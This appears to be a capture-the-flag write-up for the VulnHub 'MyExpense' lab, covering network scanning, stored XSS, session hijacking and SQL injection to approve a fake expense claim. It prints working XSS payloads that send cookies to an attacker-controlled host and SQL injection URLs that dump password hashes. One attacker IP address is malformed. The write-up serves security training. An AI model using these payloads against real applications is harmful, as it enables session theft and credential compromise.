# MyExpense

- **Target Machine - MyExpense**: [https://www.vulnhub.com/entry/myexpense-1,405/](https://www.vulnhub.com/entry/myexpense-1,405/)

---

## Scenario

You are **Samuel Lamotte**, and you’ve just been fired from your company **Furtura Business Informatique**. Unfortunately, due to the abrupt departure, you didn’t have the chance to validate the expense report from your last business trip, totaling €750 — the cost of a round-trip flight with your last client.
Fearing your former employer might refuse to reimburse you, you decide to hack into the internal application called **"MyExpense"**, used by the company to manage employee expense reports.
 
You are currently parked outside the company building, connected to the internal Wi-Fi network (the password hasn’t been changed since your departure). The application is protected by a login form with username and password authentication. You hope your credentials still work.

Known credentials:  
`slamotte:fzghn4lw`

Once the challenge is completed successfully, the flag will appear within the application while logged in as **Samuel**.

---

## 1. Discovery and Initial Enumeration

### Network Discovery and IP Identification

Discovered the machine’s IP: `192.168.56.101`

```bash
arp-scan -I enp0s8 --localnet --ignoredups
````

### Full Port Scan

Once the IP was known, a full port scan was performed:

```bash
nmap -sS -Pn -n -p- --min-rate --open 5000 192.168.56.101 -oG ./nmap/allports
```

![Nmap All Ports](images/Pasted%20image%2020250719171605.png)

Since the challenge context mentions a web application, focus was directed to port 80.

### Service Enumeration

```bash
nmap -sCV -p80 -Pn -n 192.168.56.101 -oN ./nmap/recon
```

![Nmap Recon](images/Pasted%20image%2020250719172052.png)

The scan revealed valuable insights, such as the presence of an `/admin/` directory. Additionally, it showed the absence of the `HttpOnly` flag, which may leave the application vulnerable to cookie theft.

---

### Accessing Admin Interface

Accessing the directory `http://192.168.56.101/admin/admin.php` revealed a list of active and inactive users. Our user `slamotte` appears as **inactive**.

![Admin Interface](images/Pasted%20image%2020250719172553.png)

---

## 2. Exploitation - Account Creation and Stored XSS

It was found that the **signup button** could be bypassed to create new users even when it appeared disabled.

![Signup Form](images/Pasted%20image%2020250719173049.png)

Upon discovering this, an attempt was made to inject a basic XSS payload into the `firstname` and `lastname` fields. It was successful:

```javascript
<script>alert("XSS")</script>
```

Returning to `http://192.168.56.101/admin/admin.php`, the alert was triggered:

![XSS Triggered](images/Pasted%20image%2020250719173537.png)

---

### Cookie Theft Attempt

Attempted to steal cookies by injecting a malicious script in the form:

```javascript
<script src="http://192.168.56.102/robcookies.js">

	var request = new XMLHttpRequest();
	request.open('GET','http://10.0.2.15/?cookie=' + document.cookie );
	request.send();

</script>
```

Successfully captured the admin (`rmasson`) cookies. However, session hijacking failed due to a restriction: only **one session per user** is allowed simultaneously.

---

### Forced Admin Action via XSS

The admin user (`rmasson`) actively monitors new user registrations. Knowing this, an XSS payload was crafted to **force the admin to reactivate** the `slamotte` account via a crafted request:

```javascript
<script src="http://192.168.56.102/script.js"></script>
```

The hosted script contained:

```javascript
var domain = " http://192.168.56.101/admin/admin.php?id=11&status=active";
var req1 = new XMLHttpRequest();
req1.open('GET', domain, false);
req1.send();
```

Started the listener:

```bash
python -m http.server 80
```

![Listener Started](images/Pasted%20image%2020250719180209.png)

---

## 3. Access Recovered and Expense Submitted

Successfully logged into the **slamotte** account. The €750 expense was still pending and was submitted:

![Expense Submitted](images/Pasted%20image%2020250719180743.png)

---

## 4. XSS in Internal Chat & Session Hijacking

The platform includes a chat feature with messages from both the **Manager (Manon Riviere)** and the **Finance Approver**.

![Chat Feature](images/Pasted%20image%2020250719181214.png)

Suspecting the chat might be vulnerable to XSS, the following script was injected:

```javascript
<script src="http://192.268.56.102:4749/robcookies.js"></script>
```

Script content:

```javascript
var request = new XMLHttpRequest();
request.open('GET','http://192.268.56.102:4444/?cookie=' + document.cookie);
request.send();
```

Cookies from chat users were successfully exfiltrated:

![Cookies Exfiltrated](images/Pasted%20image%2020250719183341.png)

Switched session to the **manager (Manon Riviere)** using the cookie:
`6tqplpcj4n4dl43kig1dipdc32`

![Manager Session](images/Pasted%20image%2020250719183914.png)

With manager access, approved the previously submitted expense:

![Expense Approved](images/Pasted%20image%2020250719184016.png)

---

## 5. SQL Injection - Extracting Credentials

While browsing the **Rennes** section, it was found that the parameter `?id=` was vulnerable to SQL Injection.

Confirmed with:

```http
http://192.168.56.101/site.php?id=2 order by 2 -- -
```

![SQL Order By](images/Pasted%20image%2020250719184415.png)

Extracted the database name using:

```http
http://192.168.56.101/site.php?id=2 union select 1,database()-- -
```

![Database Extracted](images/Pasted%20image%2020250719184739.png)

Listed all tables:

```http
http://192.168.56.101/site.php?id=2 union select 1,table_name from information_schema.tables where table_schema='myexpense'-- -
```

![Tables Listed](images/Pasted%20image%2020250719185243.png)

Targeted the `user` table and listed its columns:

```http
http://192.168.56.101/site.php?id=2 union select 1,column_name from information_schema.columns where table_schema='myexpense' and table_name='user'-- -
```

![Columns Listed](images/Pasted%20image%2020250719185605.png)

Finally, dumped usernames and password hashes:

```http
http://192.168.56.101/site.php?id=2 union select 1,group_concat(username,0x3a,password) from user-- -
```

![Hashes Dumped](images/Pasted%20image%2020250719185939.png)

Used **hashes.com** to crack the hashes online.

The relevant user was: `pbaudouin`
Recovered password in plaintext: `HackMe`

![Password Cracked](images/Pasted%20image%2020250719190204.png)

---

## 6. Final Step – Expense Fully Approved

Logged in as `pbaudouin`, found the pending expense and approved it:

![Final Approval](images/Pasted%20image%2020250719190514.png)

Finally, logged back in as `slamotte` to confirm that the €750 reimbursement was approved and completed:

![Challenge Completed](images/Pasted%20image%2020250719190657.png)

✅ Challenge successfully completed.

```

---
